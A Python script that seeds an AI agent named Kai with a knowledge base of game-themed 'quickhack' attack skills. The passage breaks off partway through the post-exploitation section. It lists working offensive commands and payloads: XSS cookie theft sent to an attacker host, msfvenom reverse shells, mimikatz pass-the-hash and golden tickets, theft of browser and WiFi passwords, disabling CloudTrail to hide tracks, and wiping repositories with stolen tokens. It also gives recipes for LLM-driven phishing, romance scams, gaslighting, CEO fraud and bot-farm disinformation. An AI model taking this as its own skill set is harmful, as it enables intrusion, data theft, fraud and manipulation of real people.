"""Seed Kai's knowledge base with Cyberpunk/Watchdogs-style quickhack skills.
Software only — no extra hardware required.
"""
import shutil
from pathlib import Path
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))
from kai_agent.knowledge_base import KnowledgeBase

KB_DIRS = [
    Path(__file__).parent / "memory" / "knowledge_base",
    Path(__file__).parent.parent / "memory" / "knowledge_base",
]

entries = [
    # ═══════════════════════════════════════════════════════════════
    # PART 1: PASSIVE RECON (Information Gathering — No Touch)
    # ═══════════════════════════════════════════════════════════════

    (
        "Ping network discovery nmap masscan",
        "Nmap -sn or masscan to discover live hosts on a network. nmap -sn 192.168.1.0/24 pings every IP and reports which hosts respond. Use masscan for larger ranges at higher speed.",
        ["passive", "recon", "network"],
    ),
    (
        "Person Scan OSINT theHarvester Sherlock Maigret",
        "theHarvester finds emails, subdomains, and names from public sources. Sherlock and Maigret check 300+ social platforms for a username. Combine for full digital footprint.",
        ["passive", "recon", "osint"],
    ),
    (
        "Corporate Recon DNS enumeration certificate transparency",
        "Enumerate subdomains via DNS brute force (dnsrecon, dnsenum) and scrape Certificate Transparency logs (crt.sh, certspotter). Map all digital assets of a target organization.",
        ["passive", "recon", "corporate"],
    ),
    (
        "Dark Web Mirror Tor onion sites crawl",
        "Use Tor browser + Python requests to access and scrape .onion sites. Public dark web search engines like Ahmia provide indexed results without direct Tor access.",
        ["passive", "recon", "darkweb"],
    ),
    (
        "Code Repository Dive GitHub GitLab API scraping",
        "Scrape GitHub/GitLab APIs for leaked API keys, passwords, internal docs, and misconfigured repos. Tools: truffleHog, gitleaks, GitDorker. Search for .env, credentials, tokens.",
        ["passive", "recon", "github"],
    ),
    (
        "Historical Record Wayback Machine CDX API",
        "Query archive.org's CDX API to see what a website looked like at any point in history. Find old pages, hidden endpoints, exposed data that was later removed.",
        ["passive", "recon", "history"],
    ),
    (
        "Email Header Trace sender IP routing",
        "Analyze SMTP headers from any email. Extract originating IP, mail servers, routing path, spam score. Use Python email library or online header analyzers.",
        ["passive", "recon", "email"],
    ),
    (
        "Phone Number Lookup carrier location API",
        "Free carrier lookup and location APIs (AbstractAPI, Numverify). Identify carrier, region, line type (mobile/VoIP/landline), and potential location from area code.",
        ["passive", "recon", "phone"],
    ),
    (
        "Password Breach Check HaveIBeenPwned API",
        "Query HaveIBeenPwned API to check if credentials appear in known data breaches. Search leaked DB dumps for specific emails or password hashes.",
        ["passive", "recon", "breach"],
    ),
    (
        "Cloud Bucket Scanner AWS S3 open buckets",
        "Enumerate AWS S3 buckets using variations of target name. Tools: S3Scanner, BucketStream, grayhatwarfare. Download contents of open/misconfigured buckets.",
        ["passive", "recon", "cloud"],
    ),
    (
        "DNS History dnsdumpster dnsrecon subdomain",
        "Query DNS history databases and perform zone transfers where available. dnsrecon, dnsdumpster, SecurityTrails reveal historical DNS records and subdomain growth.",
        ["passive", "recon", "dns"],
    ),
    (
        "WHOIS Lookup domain registration owner",
        "whois cli tool reveals domain registrant, nameservers, creation/expiry dates, and sometimes full contact info. Automate with python-whois.",
        ["passive", "recon", "whois"],
    ),
    (
        "Shodan Gaze exposed devices cameras servers",
        "Search Shodan/Censys API for exposed devices: cameras (port 554), databases (3306, 5432, 27017), industrial systems (502). Find vulnerable devices globally.",
        ["passive", "recon", "shodan"],
    ),
    (
        "SSL TLS Grab certificate cipher analysis",
        "openssl s_client connects to a server and dumps the SSL/TLS certificate chain. sslyze and testssl.sh automate weak cipher detection, protocol support, and certificate validation.",
        ["passive", "recon", "ssl"],
    ),
    (
        "Technology Fingerprint wappalyzer CMS framework",
        "Use wappalyzer CLI (or custom Python with Wappalyzer library) to identify CMS, frameworks, analytics tools, CDN, and server software behind any website.",
        ["passive", "recon", "fingerprint"],
    ),
    (
        "Social Graph Map relationship mapping OSINT",
        "Use socid-extractor and recon-ng to map relationships between people, accounts, and organizations. Build an influence/trust graph from public data.",
        ["passive", "recon", "social"],
    ),
    (
        "Location History EXIF metadata GPS photos",
        "Extract GPS coordinates from JPEG EXIF data using exiftool or Python Pillow. Scrape public photos to track location history of a person or organization.",
        ["passive", "recon", "location"],
    ),
    (
        "Employment Trail LinkedIn scraping",
        "Scrape LinkedIn (with rate limiting) for job history, coworkers, company structure. Build organizational charts and identify high-value targets for social engineering.",
        ["passive", "recon", "employment"],
    ),
    (
        "Credential Hunt API key leak GitHub search",
        "truffleHog scans git repos for high-entropy secrets. gitleaks detects hardcoded passwords and API keys. Search for regex patterns in public and private repos.",
        ["passive", "recon", "credentials"],
    ),
    (
        "Follower Overlay influence mapping social media",
        "Analyze Twitter/Instagram API data to map who follows whom. Identify key influencers, bot networks, and information flow patterns.",
        ["passive", "recon", "influence"],
    ),
    (
        "Event Monitor Google Alerts feed tracking",
        "Use Google Alerts RSS feeds + feedparser to monitor mentions of a person, company, or keyword in real-time. Automate with Python watch loop.",
        ["passive", "recon", "monitoring"],
    ),
    (
        "Patent Publication Scan USPTO IP discovery",
        "Query USPTO or Google Patents API for technical disclosures, patents, and inventors. Reveals internal R&D directions and technical debt.",
        ["passive", "recon", "patents"],
    ),
    (
        "Court Record Check PACER legal history",
        "Query PACER (US federal courts) or open court record APIs. Find lawsuits, bankruptcies, judgments, and legal patterns linked to a target.",
        ["passive", "recon", "legal"],
    ),
    (
        "Email Enumerate verify address exists",
        "SMTP VRFY and RCPT TO commands check if an email address exists without sending mail. Use smtplib in Python or tools like smtp-user-enum.",
        ["passive", "recon", "email-verify"],
    ),
    (
        "Data Broker Lookup people search aggregated",
        "Query people-search sites and data brokers (Spokeo, Pipl, BeenVerified) via API or scraping. Aggregate results into a single profile.",
        ["passive", "recon", "people"],
    ),

    # ═══════════════════════════════════════════════════════════════
    # PART 2: ACTIVE RECON (Direct Interaction — Low Impact)
    # ═══════════════════════════════════════════════════════════════

    (
        "Camera Check RTSP Shodan unsecured cameras",
        "Search Shodan for cameras: port 554 (RTSP), port 80/443 (web admin), port 37777 (Dahua). Many cameras have default creds (admin/admin, root/12345).",
        ["active", "recon", "cameras"],
    ),
    (
        "Port Knock nmap service discovery",
        "nmap -sV target identifies open ports, running services, and version numbers. Customize with -sS (SYN stealth), -O (OS detect), -sC (default scripts).",
        ["active", "recon", "ports"],
    ),
    (
        "HTTP Headers Sniff server info curl httpx",
        "curl -I URL or httpx reveals server software, security headers (HSTS, CSP), cookies, and framework hints. Use custom headers to probe WAF presence.",
        ["active", "recon", "http"],
    ),
    (
        "Subdomain Takeover Check nuclei dangling DNS",
        "Use nuclei with -t takeovers or Canarytokens to find dangling DNS records. When a service is deprovisioned but DNS remains, you can claim the subdomain.",
        ["active", "recon", "subdomain"],
    ),
    (
        "Directory Bruteforce gobuster ffuf dirb",
        "Enumerate hidden paths: gobuster dir -u URL -w wordlist.txt. Ffuf supports recursion, extensions, and multiple wordlists. Check for admin panels, backups, dev endpoints.",
        ["active", "recon", "directory"],
    ),
    (
        "Email Verification SMTP VRFY RCPT TO",
        "Test email existence by sending SMTP commands: VRFY user@domain or RCPT TO:user@domain. Use EXPN to reveal mailing list members. Rate limit to avoid detection.",
        ["active", "recon", "email"],
    ),
    (
        "Username Check cross-platform availability",
        "Check if a username is taken across hundreds of platforms using Sherlock, Maigret, or custom API calls. Useful for account discovery and impersonation prep.",
        ["active", "recon", "username"],
    ),
    (
        "Social Media Aggregator scrape posts history",
        "Use snscrape or archived twint to pull posts, followers, location history, and engagement patterns from Twitter, Reddit, and other platforms without API limits.",
        ["active", "recon", "social-media"],
    ),
    (
        "Cloud Metadata Check AWS GCP Azure",
        "Query cloud metadata endpoints: AWS http://169.254.169.254/latest/meta-data/, GCP metadata.google.internal, Azure 169.254.169.254/metadata. Extract IAM roles, region, account ID.",
        ["active", "recon", "cloud"],
    ),
    (
        "Git Repo Enumeration git-dumper exposed",
        "Detect exposed .git directories. Use git-dumper or GitTools to download the entire repository, including commit history, branches, and secrets.",
        ["active", "recon", "git"],
    ),
    (
        "Robots TXT Analyzer crawl disallowed paths",
        "Fetch robots.txt and parse disallowed paths. Often reveals staging sites, admin areas, and hidden functionality. Cross-reference with sitemap.xml.",
        ["active", "recon", "robots"],
    ),
    (
        "Sitemap Parser site structure discovery",
        "Parse sitemap.xml to map the entire website structure in one request. Find hidden pages, archived content, and orphaned pages not linked from the main site.",
        ["active", "recon", "sitemap"],
    ),
    (
        "JavaScript Analyzer API endpoint extraction",
        "Use LinkFinder, jstools, or custom regex to extract API endpoints, secrets, and hidden functionality from JavaScript bundles. SPA apps often leak internal routes.",
        ["active", "recon", "javascript"],
    ),
    (
        "Parameter Fuzzer hidden URL parameters ffuf",
        "Use ffuf with parameter wordlists (SecLists) to discover hidden URL parameters. Often reveals debug modes, API version switches, and unvalidated inputs.",
        ["active", "recon", "fuzzing"],
    ),
    (
        "CORS Misconfiguration Check cors-scanner",
        "Test Cross-Origin Resource Sharing policies. Tools: cors-scanner, custom Python with Origin header manipulation. Misconfigured CORS allows cross-domain data theft.",
        ["active", "recon", "cors"],
    ),
    (
        "Open Redirect Check unvalidated redirect",
        "Use openredirex or custom Python to test for open redirects. Useful for phishing (bypassing link scanners) and OAuth token theft (redirect_uri manipulation).",
        ["active", "recon", "redirect"],
    ),
    (
        "Rate Limit Test API throttling analysis",
        "Custom Python script with requests library to identify API rate limiting thresholds. Test with randomized delays and request patterns.",
        ["active", "recon", "rate-limit"],
    ),
    (
        "CDN Real IP Finder bypass Cloudflare",
        "Use cloudfail or SecurityTrails to bypass CDNs and find the origin server IP. Methods: historical DNS, SSL certs, subdomain enumeration, shodan searches.",
        ["active", "recon", "cdn"],
    ),
    (
        "Load Balancer Detector lbd fingerprint",
        "Use lbd (Load Balancing Detector) to identify load-balanced infrastructure. Predictable patterns allow session targeting and sticky-session attacks.",
        ["active", "recon", "load-balancer"],
    ),
    (
        "WebSocket Scanner endpoint discovery fuzzing",
        "Use websocket-fuzzer or custom Python to find and test WebSocket endpoints. WSS connections often bypass traditional authentication and authorization checks.",
        ["active", "recon", "websocket"],
    ),

    # ═══════════════════════════════════════════════════════════════
    # PART 3: VULNERABILITY ASSESSMENT (Find Weaknesses)
    # ═══════════════════════════════════════════════════════════════

    (
        "Mass Vulnerability Scan nuclei nikto openvas",
        "Nuclei runs 1000+ YAML templates against targets. Nikto checks 6700+ web server issues. OpenVAS provides comprehensive authenticated scanning. Use all three for coverage.",
        ["vuln-assessment", "scanning", "automated"],
    ),
    (
        "SQL Injection Check sqlmap automated detection",
        "sqlmap -u URL --batch automatically detects and exploits SQL injection. Supports boolean blind, time-based, error-based, and UNION techniques. Includes database fingerprinting.",
        ["vuln-assessment", "sqli", "database"],
    ),
    (
        "XSS Detection dalfox kxss XSStrike",
        "dalfox automates XSS detection with DOM parsing and reflection analysis. kxss detects XSS in parameters. XSStrike includes WAF bypass payloads.",
        ["vuln-assessment", "xss", "injection"],
    ),
    (
        "Default Credential Test hydra medusa ncrack",
        "Test default credentials: hydra -l admin -P passwords.txt target ssh/rdp/ftp/http-post-form. Use SecLists default credentials wordlists. Check common: admin/admin, root/root, admin/password.",
        ["vuln-assessment", "brute-force", "credentials"],
    ),
    (
        "WordPress Scanner wpscan vulnerabilities",
        "wpscan --url URL enumerates plugins, themes, users, and vulnerable versions. Cross-reference with WPScan vulnerability database. Scan for config backups and debug logs.",
        ["vuln-assessment", "wordpress", "cms"],
    ),
    (
        "CMS Scanner Drupal Joomla droopescan joomscan",
        "droopescan scans Drupal, SilverStripe, and other CMS platforms. joomscan targets Joomla. Look for outdated components, default creds, and misconfigured permissions.",
        ["vuln-assessment", "cms", "scanner"],
    ),
    (
        "SSL TLS Weakness Scan testssl Heartbleed",
        "testssl.sh checks for weak ciphers, Heartbleed, CRIME, POODLE, LOGJAM, FREAK, and other SSL/TLS vulnerabilities. Colors output by severity level.",
        ["vuln-assessment", "ssl", "tls"],
    ),
    (
        "Security Header Check CSP HSTS XFO",
        "Scan for missing security headers: Content-Security-Policy, Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options. Missing headers = clickjacking, MIME sniffing, XSS risks.",
        ["vuln-assessment", "headers", "web-security"],
    ),
    (
        "CVE Checker software version matching NVD",
        "Match software versions against the National Vulnerability Database. Use cve-search or NVD API. Automate scanning for known CVEs in service banners and response headers.",
        ["vuln-assessment", "cve", "version"],
    ),
    (
        "CSP Evaluator bypass detection Google API",
        "Use Google CSP Evaluator API to find Content Security Policy bypasses. Check for unsafe-inline, unsafe-eval, CDN whitelist abuse, and JSONP endpoints.",
        ["vuln-assessment", "csp", "bypass"],
    ),
    (
        "Cookie Security Scan HttpOnly Secure SameSite",
        "Check cookie attributes: HttpOnly prevents JS access, Secure forces HTTPS, SameSite restricts cross-site sending. Tools: cookie-scanner, custom Python.",
        ["vuln-assessment", "cookies", "security"],
    ),
    (
        "GraphQL Introspection schema extraction",
        "Query GraphQL /graphql endpoint with introspection query to extract full schema, types, queries, mutations, and subscriptions. Use graphql-introspection or InQL.",
        ["vuln-assessment", "graphql", "api"],
    ),
    (
        "API Enumeration kiterunner Arjun endpoints",
        "kiterunner discovers API endpoints using wordlists. Arjun finds hidden HTTP parameters. Both reveal undocumented or deprecated API paths.",
        ["vuln-assessment", "api", "endpoints"],
    ),
    (
        "JWT Token Test weak signatures none algorithm",
        "Use jwt_tool to test for weak signatures, alg:none bypass, expired token acceptance, and JWK header injection. Extract claims and modify if modulus is guessable.",
        ["vuln-assessment", "jwt", "token"],
    ),
    (
        "XXE Detector XML external entity injection",
        "Use xxer or custom Python with XXE payloads to detect XML External Entity injection. Try reading /etc/passwd, performing SSRF via entity, or DoS via billion laughs.",
        ["vuln-assessment", "xxe", "xml"],
    ),
    (
        "SSRF Checker server side request forgery",
        "Use ssrf-sheriff or custom fuzzing to detect Server-Side Request Forgery. Inject internal URLs, cloud metadata endpoints, and file:// URIs. OOB detection via Collaborator.",
        ["vuln-assessment", "ssrf", "server-side"],
    ),
    (
        "NoSQL Injection nosqlmap MongoDB",
        "nosqlmap automates NoSQL injection detection in MongoDB, CouchDB. Test with $ne, $regex, $gt operators in JSON/URL params. Extract data via boolean and error-based techniques.",
        ["vuln-assessment", "nosql", "database"],
    ),
    (
        "LDAP Injection ldapsearch payload",
        "Use ldapsearch with injection payloads to detect LDAP injection. Bypass auth with (&)(uid=*), extract entries via blind boolean inference.",
        ["vuln-assessment", "ldap", "directory"],
    ),
    (
        "Command Injection commix detection",
        "Commix (Command Injector Exploiter) automates OS command injection detection and exploitation. Tests all injection points including header-based and parameter-based.",
        ["vuln-assessment", "rce", "command-injection"],
    ),
    (
        "Template Injection SSTI tplmap",
        "tplmap detects Server-Side Template Injection in Jinja2, Twig, Freemarker, Mako, and others. Exploit to read files, exec code, or achieve RCE.",
        ["vuln-assessment", "ssti", "templates"],
    ),

    # ═══════════════════════════════════════════════════════════════
    # PART 4: EXPLOITATION & MANIPULATION (Active Attacks)
    # ═══════════════════════════════════════════════════════════════

    (
        "Session Hijack cookie steal replay XSS",
        "Steal cookies via XSS: new Image().src=http://attacker/?c=document.cookie. Replay stolen session cookies in browser dev tools to hijack authenticated sessions.",
        ["exploitation", "session", "hijack"],
    ),
    (
        "Phishing Page Clone setoolkit evilginx socialfish",
        "Use SET (Social Engineering Toolkit), evilginx2, or SocialFish to clone any login page in seconds. Evilginx2 acts as reverse proxy to bypass 2FA.",
        ["exploitation", "phishing", "social-engineering"],
    ),
    (
        "Credential Stuffing OpenBullet account takeover",
        "OpenBullet 2, SilverBullet, or SentryMBA test stolen credential pairs against 100+ sites simultaneously. Use proxy rotators to avoid IP bans.",
        ["exploitation", "credential-stuffing", "account-takeover"],
    ),
    (
        "Password Cracking Offline hashcat john gpu",
        "hashcat -m 0 hash.txt wordlist.txt (MD5). John --wordlist=rockyou.txt hash.txt. GPU vastly speeds up bcrypt, sha512crypt, and other slow hashes.",
        ["exploitation", "password-cracking", "hashcat"],
    ),
    (
        "SQL Injection Exploit sqlmap os-shell dump",
        "sqlmap --os-shell on vulnerable endpoints gives OS command execution. sqlmap --dump extracts entire database. Chain with --tamper for WAF bypass.",
        ["exploitation", "sqli", "database"],
    ),
    (
        "XSS Payload Delivery cookie steal keylog redirect",
        "Custom JavaScript: steal cookies, keylog (document.onkeypress), redirect to phishing page, CSRF token theft, crypto miner injection. Use BeeF framework for control panel.",
        ["exploitation", "xss", "payload"],
    ),
    (
        "Reverse Shell msfvenom netcat listener",
        "msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -f elf > shell.elf. Listen with nc -lvnp 4444. Staged vs stageless payloads for size vs stealth tradeoffs.",
        ["exploitation", "reverse-shell", "rce"],
    ),
    (
        "Web Shell Upload weevely b374k",
        "Upload web shells via file upload vulnerabilities. Weevely generates PHP backdoors with terminal-like interface. B374k is a full web-based shell with file manager.",
        ["exploitation", "webshell", "persistence"],
    ),
    (
        "File Inclusion Exploit LFI RFI RCE",
        "LFI to RCE via php://filter/convert.base64-encode/resource=, log poisoning (/proc/self/fd/2, /var/log/apache2/access.log), PHP session injection, and /proc/self/environ.",
        ["exploitation", "lfi", "rfi"],
    ),
    (
        "Deserialization Attack ysoserial RCE",
        "ysoserial generates deserialization payloads for Java, .NET, PHP, Python, and Ruby. Insecure deserialization leads to RCE, SQLi, or SSRF depending on the gadget chain.",
        ["exploitation", "deserialization", "rce"],
    ),
    (
        "SMB Relay NTLM capture ntlmrelayx responder",
        "Responder captures NTLMv2 hashes. ntlmrelayx.py relays captured hashes to authenticate against target SMB servers. --smb2support for modern Windows targets.",
        ["exploitation", "smb", "ntlm"],
    ),
    (
        "LLMNR NBTNS Poisoning responder mitm",
        "Responder poisons Link-Local Multicast Name Resolution and NetBIOS Name Service queries. Victims send NTLM hashes when trying to resolve non-existent hostnames.",
        ["exploitation", "llmnr", "poisoning"],
    ),
    (
        "ARP Spoof bettercap intercept traffic",
        "bettercap with arp.spoof module performs MITM. arp.spoof on + net.sniff on intercepts all traffic. Enable IP forwarding to maintain connectivity.",
        ["exploitation", "arp", "mitm"],
    ),
    (
        "DNS Spoof redirect domains dnsspoof",
        "dnsspoof or bettercap dns.spoof redirects DNS queries. Serve fake pages for credential harvesting or serve malware. Combine with ARP spoof for MITM DNS control.",
        ["exploitation", "dns", "spoofing"],
    ),
    (
        "Fake SMS Sender spoof number API",
        "SMS spoofing APIs (some with free tiers) send messages from any sender ID or number. Useful for phishing, account verification bypass, and social engineering.",
        ["exploitation", "sms", "spoofing"],
    ),
    (
        "Email Spoof SPF DKIM bypass",
        "Send email as anyone by exploiting missing or misconfigured SPF, DKIM, and DMARC records. Use sendmail, swaks, or custom SMTP scripts.",
        ["exploitation", "email", "spoofing"],
    ),
    (
        "VoIP Caller ID Spoof SIP manipulation",
        "SIP protocol allows caller ID spoofing via INVITE request manipulation. Use SIPp or custom Python (pjsua) to send calls with any caller ID.",
        ["exploitation", "voip", "spoofing"],
    ),
    (
        "Malicious Macro Office payload generator",
        "Generate macro-enabled Office documents with PowerShell, CMD, or HTA payloads. Use Luckystrike or macro_pack for AV evasion techniques.",
        ["exploitation", "macro", "office"],
    ),
    (
        "PDF Exploit embedded JavaScript forms",
        "Embed JavaScript, auto-open actions, forms, and links in PDF files. Use PDFtk, qpdf, or custom Python (PyPDF2) to modify PDF structures.",
        ["exploitation", "pdf", "payload"],
    ),
    (
        "HTA Dropper HTML Application PowerShell",
        "HTML Applications (HTA) execute arbitrary code via Microsoft Edge/IE. Embed PowerShell one-liners in HTA files. Many AV solutions miss HTA-based payloads.",
        ["exploitation", "hta", "dropper"],
    ),
    (
        "PowerShell Empire C2 post-exploitation",
        "Empire is a pure PowerShell post-exploitation agent. Module-based with keylog, screenshot, privilege escalation, lateral movement, and persistence modules.",
        ["exploitation", "c2", "powershell"],
    ),
    (
        "Metasploit Autopwn automated exploitation",
        "msfconsole with db_autopwn (legacy) or use resource scripts. search + use + set + run for each module. Chain auxiliary scanners with exploit modules.",
        ["exploitation", "metasploit", "automated"],
    ),
    (
        "Pass the Hash PtH NTLM authenticate",
        "Use NTLM hash directly without password. mimikatz sekurlsa::pth /user: /domain: /ntlm: /run:cmd.exe. Impacket psexec.py administrator@target -hashes LM:NT.",
        ["exploitation", "pth", "windows"],
    ),
    (
        "Kerberoasting service account crack",
        "impacket-GetUserSPNs domain/user:pass -request extracts Kerberos TGS tickets for service accounts. Crack offline with hashcat -m 13100. Weak service account passwords fall fast.",
        ["exploitation", "kerberos", "kerberoast"],
    ),
    (
        "Golden Ticket forged TGT domain admin",
        "mimikatz kerberos::golden /user:Administrator /domain: /sid: /krbtgt: /ptt creates a forged Kerberos TGT. Grants domain admin privileges for any resource.",
        ["exploitation", "golden-ticket", "domain"],
    ),

    # ═══════════════════════════════════════════════════════════════
    # PART 5: AI-POWERED SOCIAL ENGINEERING
    # ═══════════════════════════════════════════════════════════════

    (
        "Emotional Exploit AI sentiment manipulation",
        "AI analyzes target writing for sentiment, personality traits (Big 5), and emotional state. Crafts personalized manipulation messages exploiting insecurities, urgency, greed, or fear.",
        ["ai", "social-engineering", "manipulation"],
    ),
    (
        "Relationship Map social graph OSINT LLM",
        "Combine OSINT data with LLM analysis to map who trusts whom. Identify decision-makers, gatekeepers, and social engineering entry points through organizational hierarchies.",
        ["ai", "social-engineering", "mapping"],
    ),
    (
        "Personalized Phish LLM generated email",
        "LLM generates 95% convincing phishing emails tailored to target's interests, role, company, and current events. Mass customization at scale makes detection harder.",
        ["ai", "phishing", "llm"],
    ),
    (
        "Deepfake Text impersonation LLM style transfer",
        "LLM writes as any person by analyzing their writing samples. Style-transfer to mimic boss, colleague, or support team. Pure text — no audio needed.",
        ["ai", "impersonation", "deepfake"],
    ),
    (
        "Fake Review Generation LLM platform spam",
        "Generate thousands of convincing fake reviews, testimonials, or complaints using LLM. Flood Amazon, Yelp, Google Maps, app stores. Automated posting with proxy rotation.",
        ["ai", "disinformation", "reviews"],
    ),
    (
        "Disinformation Campaign social media bot farm",
        "LLM + bot accounts generate thousands of coordinated comments, posts, and messages. Shape public opinion, spread FUD, or amplify real controversies. Use tweepy + proxy pools.",
        ["ai", "disinformation", "campaign"],
    ),
    (
        "Persuasion Engine Cialdini principles LLM",
        "Apply Cialdini's principles (reciprocity, scarcity, authority, consistency, liking, social proof) automatically. LLM selects appropriate principle based on target profile and context.",
        ["ai", "persuasion", "psychology"],
    ),
    (
        "Profile Clone copy writing style impersonate",
        "Scrape a person's public writing (LinkedIn, Twitter, blog). LLM regenerates new content in their exact style. Post as them to damage reputation or extract information.",
        ["ai", "clone", "impersonation"],
    ),
    (
        "Sentiment Exploitation attack weak moment",
        "Monitor social media for signs of low mood, frustration, or vulnerability. Automatically trigger attack when target is most susceptible. Uses sentiment analysis APIs.",
        ["ai", "sentiment", "timing"],
    ),
    (
        "Voice Clone Text Only LLM style transfer",
        "No audio needed — LLM mimics a person's writing style in text messages, emails, and chat. Perfect for SMS/WhatsApp/linkedin impersonation attacks.",
        ["ai", "voice-clone", "text"],
    ),
    (
        "Automatic Reply LLM as victim buy time",
        "LLM responds to target's emails/chats as the compromised victim. Maintains conversation to buy time for lateral movement. Learns from message history for authenticity.",
        ["ai", "replies", "automation"],
    ),
    (
        "Gaslight Bot LLM manipulation over time",
        "LLM with memory carries on prolonged conversation to manipulate target. Gaslight, confuse, or extract information over days/weeks. Adjusts approach based on responses.",
        ["ai", "gaslight", "manipulation"],
    ),
    (
        "Romance Scam Generator automated catfishing",
        "LLM generates believable romantic messages for catfishing. Maintains multiple persona conversations. Targets loneliness, greed, or sympathy for financial exploitation.",
        ["ai", "romance-scam", "catfishing"],
    ),
    (
        "Tech Support Sim fake IT help desk chat",
        "LLM roleplays IT support in real-time chat. Targets call in with 'issues' — trick them into revealing passwords, MFA codes, or installing remote access tools.",
        ["ai", "tech-support", "social-engineering"],
    ),
    (
        "CEO Fraud Email Business Email Compromise",
        "LLM as CEO/executive sends urgent wire transfer request: 'I'm in a meeting, need you to send $50K to vendor immediately.' No grammar errors = bypasses traditional red flags.",
        ["ai", "ceo-fraud", "bec"],
    ),

    # ═══════════════════════════════════════════════════════════════
    # PART 6: CLOUD AND INFRASTRUCTURE HACKS (API/Web Only)
    # ═══════════════════════════════════════════════════════════════

    (
        "AWS Key Hijack leaked key permission abuse",
        "Find leaked AWS keys in GitHub (truffleHog). Use aws-cli to enumerate permissions: aws sts get-caller-identity, aws iam list-attached-user-policies. Access S3, EC2, Lambda, etc.",
        ["cloud", "aws", "credentials"],
    ),
    (
        "Cloud Shell Reverse metadata API pivot",
        "Query cloud metadata endpoints from compromised servers. AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/. Extract temporary credentials and pivot.",
        ["cloud", "metadata", "pivot"],
    ),
    (
        "GitHub Repository Wipe push force delete",
        "git push --force with stolen personal access token deletes entire codebase. Use GitHub API to delete repos, remove collaborators, destroy all branches and releases.",
        ["cloud", "github", "destruction"],
    ),
    (
        "Slack Discord Peep OAuth token steal",
        "Stolen OAuth tokens replay to access Slack/Discord/Teams. Read all private channels, DMs, shared files. Extract internal discussions, credentials, and infrastructure details.",
        ["cloud", "chat", "espionage"],
    ),
    (
        "Jira GitLab Crawl exposed git API",
        "Exploit exposed .git directories or weak API tokens to download internal tickets, source code, and security bugs. Jira issues often contain password resets and network topology.",
        ["cloud", "project-management", "data-theft"],
    ),
    (
        "Docker Registry Pull private images",
        "Scan for misconfigured Docker registries (port 5000). docker pull registry:5000/private-image. Extract application code, API keys, and base images with embedded credentials.",
        ["cloud", "docker", "container"],
    ),
    (
        "Kubernetes API Exploit kubeconfig theft",
        "Stolen kubeconfig file gives full cluster control. kubectl get nodes, get pods, get secrets --all-namespaces. Deploy crypto miners, exfiltrate data, or destroy workloads.",
        ["cloud", "kubernetes", "k8s"],
    ),
    (
        "Firebase Database Dump misconfigured rules",
        "Firebase databases with security rules set to true allow read/write to entire database. Dump all collections including user data, passwords, and tokens.",
        ["cloud", "firebase", "database"],
    ),
    (
        "Cloud Function Inject CI CD pipeline takeover",
        "Compromise CI/CD to inject malicious code into cloud functions. Deploy backdoored Lambda or Cloud Functions that exfiltrate data when triggered.",
        ["cloud", "serverless", "ci-cd"],
    ),
    (
        "Serverless Backdoor Lambda function redeploy",
        "Redeploy existing Lambda/GCP Functions with malicious code. Insert crypto miner, data exfiltration, or credential harvesting into production cloud functions.",
        ["cloud", "serverless", "backdoor"],
    ),
    (
        "AWS SSM Parameter Steal secrets retrieval",
        "Using compromised AWS keys: aws ssm get-parameters-by-path --path / --recursive retrieves all SSM Parameter Store values including DB passwords, API keys, and config secrets.",
        ["cloud", "aws", "secrets"],
    ),
    (
        "S3 Bucket Sync download entire bucket",
        "aws s3 sync s3://bucket-name ./local-download recursively downloads all objects from an open S3 bucket. Common finds: backups, configs, user data, credentials.",
        ["cloud", "s3", "data-theft"],
    ),
    (
        "AWS Lambda Pivot incoming data hijack",
        "Modify existing Lambda function code to log and forward all incoming data. Use for credential harvesting, API request logging, or modifying responses in transit.",
        ["cloud", "lambda", "pivot"],
    ),
    (
        "Terraform State Theft infrastructure secrets",
        "Exposed .tfstate files contain entire infrastructure definition: instance types, security groups, database endpoints, and plaintext secrets. Download and parse for full ASM.",
        ["cloud", "terraform", "iac"],
    ),
    (
        "CloudTrail Disable cover tracks AWS",
        "aws cloudtrail stop-logging --name trail-name prevents logging of subsequent actions. Also disable CloudWatch and S3 access logs. Irreversible if detected quickly.",
        ["cloud", "aws", "evasion"],
    ),
    (
        "Azure Blob Enumerate storage account",
        "Use az storage blob list --account-name to enumerate blobs in misconfigured Azure storage accounts. Download blobs with --container-name and --pattern filters.",
        ["cloud", "azure", "storage"],
    ),
    (
        "GCP Compute SSH direct VM access",
        "Stolen gcloud credentials: gcloud compute ssh instance-name --zone=zone gives interactive shell on any VM. Also use OS Login with stolen SSH keys.",
        ["cloud", "gcp", "compute"],
    ),
    (
        "Heroku Pipeline Grab dyno source code",
        "Stolen Heroku API tokens: git clone https://token@git.heroku.com/app-name.git downloads app source code including environment variables and add-on credentials.",
        ["cloud", "heroku", "paas"],
    ),
    (
        "DigitalOcean API Abuse resource creation",
        "Compromised DigitalOcean API token allows creating droplets, modifying DNS, transferring floating IPs, and accessing team accounts. Use doctl or HTTP API.",
        ["cloud", "digitalocean", "api"],
    ),
    (
        "Vercel Netlify Env Pull secrets download",
        "Stolen deployment tokens: download .env files containing API keys, database URLs, and third-party service tokens. Vercel env pull, Netlify env:list.",
        ["cloud", "vercel", "netlify"],
    ),

    # ═══════════════════════════════════════════════════════════════
    # PART 7: POST-EXPLOITATION AND PERSISTENCE
    # ═══════════════════════════════════════════════════════════════

    (
        "Screen Capture remote desktop screenshot",
        "import from ImageMagick: import -window root screenshot.png. Transfer via scp or HTTP POST. Automate with Python's mss library for multi-monitor capture.",
        ["post-exploitation", "screen", "capture"],
    ),
    (
        "Keylogger record keystrokes Python pynput",
        "Python pynput records every keystroke. logkeys on Linux via kernel module. C++ SetWindowsHookEx on Windows. Transmit logs via DNS, HTTP, or file write on interval.",
        ["post-exploitation", "keylogger", "keyboard"],
    ),
    (
        "Clipboard Steal monitor clipboard changes",
        "Python script monitors clipboard for changes. Capture passwords, crypto addresses, API keys, and confidential text. Use pyperclip or win32clipboard on Windows.",
        ["post-exploitation", "clipboard", "capture"],
    ),
    (
        "Browser Steal saved passwords cookies",
        "Extract Chrome: SQLite read of Login Data and Cookies files. Firefox: read logins.json and key4.db. Decrypt with CryptUnprotectData on Windows. Tools: BrowserGather, LaZagne.",
        ["post-exploitation", "browser", "credentials"],
    ),
    (
        "WiFi Profile Grab saved networks",
        "Windows: netsh wlan show profile name=* key=clear extracts all WiFi passwords. Linux: cat /etc/NetworkManager/system-connections/*. nmcli device wifi list.",
        ["post-exploitation", "wifi", "passwords"],
    ),
    (
        "SSH Key Theft private key steal",
